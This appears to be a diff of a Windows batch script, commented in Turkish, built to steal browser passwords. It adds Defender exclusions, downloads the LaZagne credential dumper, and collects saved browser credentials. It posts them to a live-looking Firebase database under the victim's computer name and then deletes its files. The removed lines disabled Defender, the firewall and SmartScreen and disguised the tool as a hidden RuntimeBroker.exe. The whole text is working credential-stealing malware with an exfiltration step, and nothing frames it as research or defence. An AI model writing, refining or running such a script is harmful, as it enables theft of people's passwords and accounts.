@@ -1,5 +1,5 @@
 @echo off
-:: Yönetici kontrolü
+:: Step 1: Yönetici kontrolü
 net session >nul 2>&1
 if %ERRORLEVEL% neq 0 (
     echo [+] Bu scriptin çalışması için yönetici izni gerekiyor!
@@ -8,92 +8,68 @@ if %ERRORLEVEL% neq 0 (
     exit
 )
 
-:: Çıkış kodlarını saklamak için geçici dosya
-set LOGFILE=%TEMP%\script_log.txt
+:: Step 2: Log dosyası oluştur
+set LOGFILE=%TEMP%\browser_steal_log.txt
 echo [%DATE% %TIME%] Script başlatıldı > "%LOGFILE%"
 
-:: Chrome ve Edge işlemlerini kapat
-echo [%DATE% %TIME%] Tarayıcılar kapatılıyor... >> "%LOGFILE%"
-taskkill /F /IM chrome.exe >nul 2>&1
-taskkill /F /IM msedge.exe >nul 2>&1
-
-:: Windows Defender kapatma
-echo [%DATE% %TIME%] Windows Defender kapatılıyor... >> "%LOGFILE%"
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableScriptScanning $true -DisableArchiveScanning $true -DisableCatchupFullScan $true -DisableCatchupQuickScan $true" >nul 2>&1
-powershell -Command "Stop-Service -Name WinDefend -Force" >nul 2>&1
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value 1 -Type DWord -Force" >nul 2>&1
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection' -Name 'DisableBehaviorMonitoring' -Value 1 -Type DWord -Force" >nul 2>&1
-
-:: Windows Firewall kapatma
-echo [%DATE% %TIME%] Windows Firewall kapatılıyor... >> "%LOGFILE%"
-powershell -Command "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False" >nul 2>&1
-
-:: Windows SmartScreen kapatma
-echo [%DATE% %TIME%] Windows SmartScreen kapatılıyor... >> "%LOGFILE%"
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\System' -Name 'EnableSmartScreen' -Value 0 -Type DWord -Force" >nul 2>&1
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer' -Name 'SmartScreenEnabled' -Value 'Off' -Type String -Force" >nul 2>&1
-powershell -Command "Set-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\MicrosoftEdge\PhishingFilter' -Name 'EnabledV9' -Value 0 -Type DWord -Force" >nul 2>&1
-
-:: Defender исключение ekleme (RuntimeBroker.exe için)
-echo [%DATE% %TIME%] Defender için RuntimeBroker.exe исключение ekleniyor... >> "%LOGFILE%"
-powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'RuntimeBroker.exe'" >nul 2>&1
-
+:: Step 3: Çalışma dizinine geç
 cd /d %TEMP%
 echo [%DATE% %TIME%] Çalışma dizini: %CD% >> "%LOGFILE%"
 
-:: Önce varsa eski dosyaları sil
-if exist RuntimeBroker.exe (
-    echo [%DATE% %TIME%] Eski RuntimeBroker.exe siliniyor... >> "%LOGFILE%"
-    del /f /q RuntimeBroker.exe >nul 2>&1
+:: Step 4: Eski dosyaları sil
+if exist lazagne.exe (
+    echo [%DATE% %TIME%] Eski lazagne.exe siliniyor... >> "%LOGFILE%"
+    del /f /q lazagne.exe >nul 2>&1
 )
 if exist results (
     echo [%DATE% %TIME%] Eski results klasörü siliniyor... >> "%LOGFILE%"
     rd /s /q results >nul 2>&1
 )
 
-:: Lazagne indir (önce curl, sonra PowerShell fallback)
-echo [%DATE% %TIME%] Lazagne indiriliyor (curl ile)... >> "%LOGFILE%"
-curl -L -o RuntimeBroker.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
+:: Step 5: Defender исключение ekle (minimal)
+echo [%DATE% %TIME%] Defender için исключение ekleniyor... >> "%LOGFILE%"
+powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%' -ExclusionProcess 'lazagne.exe' -ExclusionExtension 'exe'" >nul 2>&1
+
+:: Step 6: Lazagne indir
+echo [%DATE% %TIME%] Lazagne indiriliyor... >> "%LOGFILE%"
+curl -L -o lazagne.exe https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe >nul 2>&1
 if %ERRORLEVEL% neq 0 (
     echo [%DATE% %TIME%] HATA: Curl indirme başarısız, PowerShell ile deneniyor... >> "%LOGFILE%"
-    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'RuntimeBroker.exe' } catch { Write-Output ('HATA: PowerShell indirme başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+    powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe' -OutFile 'lazagne.exe' } catch { Write-Output ('HATA: PowerShell indirme başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
     if %ERRORLEVEL% neq 0 (
         echo [%DATE% %TIME%] HATA: PowerShell indirme de başarısız! >> "%LOGFILE%"
-        echo [+] Lazagne indirilemedi, lütfen internet bağlantısını veya antivirüsü kontrol edin.
+        echo [+] Dosya indirilemedi, lütfen internet bağlantısını kontrol edin.
         goto :cleanup
     )
 )
 
-:: Dosyanın varlığını ve boyutunu kontrol et
-if exist RuntimeBroker.exe (
-    for %%F in (RuntimeBroker.exe) do (
+:: Step 7: lazagne.exe dosyasını kontrol et
+if exist lazagne.exe (
+    for %%F in (lazagne.exe) do (
         if %%~zF LSS 1000 (
-            echo [%DATE% %TIME%] HATA: RuntimeBroker.exe bozuk veya boş (%%~zF bayt)! >> "%LOGFILE%"
-            del /f /q RuntimeBroker.exe >nul 2>&1
-            echo [+] Lazagne dosyası bozuk, lütfen tekrar deneyin.
+            echo [%DATE% %TIME%] HATA: lazagne.exe bozuk veya boş (%%~zF bayt)! >> "%LOGFILE%"
+            del /f /q lazagne.exe >nul 2>&1
+            echo [+] lazagne.exe bozuk, lütfen tekrar deneyin.
             goto :cleanup
         )
     )
-    echo [%DATE% %TIME%] RuntimeBroker.exe başarıyla indirildi. >> "%LOGFILE%"
+    echo [%DATE% %TIME%] lazagne.exe başarıyla indirildi. >> "%LOGFILE%"
 ) else (
-    echo [%DATE% %TIME%] HATA: RuntimeBroker.exe indirilemedi! >> "%LOGFILE%"
-    echo [+] Lazagne indirilemedi, lütfen internet bağlantısını veya antivirüsü kontrol edin.
+    echo [%DATE% %TIME%] HATA: lazagne.exe indirilemedi! >> "%LOGFILE%"
+    echo [+] lazagne.exe indirilemedi, lütfen bağlantıyı kontrol edin.
     goto :cleanup
 )
 
-attrib +h RuntimeBroker.exe
-echo [%DATE% %TIME%] RuntimeBroker.exe gizlendi >> "%LOGFILE%"
-
-:: Lazagne ile şifreleri topla
+:: Step 8: Şifreleri topla
 echo [%DATE% %TIME%] Şifreler toplanıyor... >> "%LOGFILE%"
-RuntimeBroker.exe browsers -oN -output results >nul 2>&1
+lazagne.exe browsers -oN -output results >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [%DATE% %TIME%] HATA: Lazagne çalıştırılamadı! >> "%LOGFILE%"
-    set DATA=NoDataCollected
-    goto :send_to_firebase
+    echo [%DATE% %TIME%] HATA: lazagne.exe çalıştırılamadı! >> "%LOGFILE%"
+    echo [+] Şifre toplama başarısız, lütfen dosyayı kontrol edin.
+    goto :cleanup
 )
 
-:: Firebase'e veri gönderme için data hazırla
+:: Step 9: Firebase’e veri gönder
 set LOGFILE=results\browsers.txt
 set DATA=
 
@@ -102,13 +78,11 @@ if exist "%LOGFILE%" (
     setlocal EnableDelayedExpansion
     for /f "usebackq delims=" %%A in ("%LOGFILE%") do (
         set "line=%%A"
-        :: JSON için güvenli kaçış: \, ", ve kontrol karakterlerini değiştir
         set "line=!line:\=\\!"
         set "line=!line:"=\\\"!"
         set "line=!line:^|=\\|!"
         set "line=!line:^&=\\&!"
         set "line=!line:^^=\\^!"
-        :: Yeni satırları \n ile değiştir
         set "line=!line:
 =\\n!"
         set "DATA=!DATA!!line!\\n"
@@ -119,28 +93,25 @@ if exist "%LOGFILE%" (
     set DATA=NoDataCollected
 )
 
-:: Firebase URL (Kendi Firebase URL'ni buraya ekle)
-set FB=https://YOUR_FIREBASE_URL_HERE/credentialsa.json
+:: Firebase URL with /credentials/%COMPUTERNAME%
+set FB=https://check-6c35e-default-rtdb.asia-southeast1.firebasedatabase.app/credentials/%COMPUTERNAME%.json
 echo [%DATE% %TIME%] Firebase URL: %FB% >> "%LOGFILE%"
 
-:: Powershell ile JSON gönderme
-echo [%DATE% %TIME%] Firebase'e veri gönderiliyor... >> "%LOGFILE%"
+echo [%DATE% %TIME%] Firebase’e veri gönderiliyor... >> "%LOGFILE%"
 powershell -Command ^
-  "try { $json = '{\"log\":\"%DATA%\"}' -replace '[\x00-\x1F\x7F]', ''; Invoke-RestMethod -Uri '%FB%' -Method POST -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gönderim başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
+  "try { $json = '{\"log\":\"%DATA%\"}'; Invoke-RestMethod -Uri '%FB%' -Method PATCH -Body $json -ContentType 'application/json' } catch { Write-Output ('HATA: Firebase gönderim başarısız: ' + $_.Exception.Message) | Out-File -FilePath '%LOGFILE%' -Append }" >nul 2>&1
 if %ERRORLEVEL% neq 0 (
-    echo [%DATE% %TIME%] HATA: Powershell Firebase gönderimi başarısız! >> "%LOGFILE%"
+    echo [%DATE% %TIME%] HATA: Firebase gönderim başarısız! >> "%LOGFILE%"
+    echo [+] Firebase’e veri gönderilemedi, log dosyasını kontrol edin.
 )
 
-:: Temizlik
+:: Step 10: Temizlik
 :cleanup
 echo [%DATE% %TIME%] Temizlik yapılıyor... >> "%LOGFILE%"
-if exist RuntimeBroker.exe del /f /q RuntimeBroker.exe >nul 2>&1
+if exist lazagne.exe del /f /q lazagne.exe >nul 2>&1
 if exist results rd /s /q results >nul 2>&1
 
 echo [%DATE% %TIME%] İşlem tamamlandı, çıkılıyor... >> "%LOGFILE%"
 echo [+] İşlem tamamlandı, çıkılıyor...
 timeout /t 3 >nul
-
-:: Hata ayıklama için log dosyasını göster
-:: type "%LOGFILE%"
 exit
